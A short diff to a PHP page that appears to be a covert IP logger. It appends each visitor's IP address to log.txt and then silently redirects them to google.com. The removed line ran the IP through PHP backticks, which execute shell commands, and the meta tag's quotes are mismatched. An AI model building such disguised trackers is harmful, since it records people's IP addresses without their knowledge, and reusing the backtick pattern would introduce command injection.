@@ -1,8 +1,7 @@
 <?php
-$myfile = fopen("log.txt", "w");
+$myfile = fopen("log.txt", "a");
 $ip=$_SERVER['REMOTE_ADDR'];
-$txt = (`${ip}\n`);
-fwrite($myfile, $txt);
+fwrite($myfile, $ip);
 fclose($myfile);
 ?>
 <meta http-equiv="Refresh" content="1; url='https://google.com" />
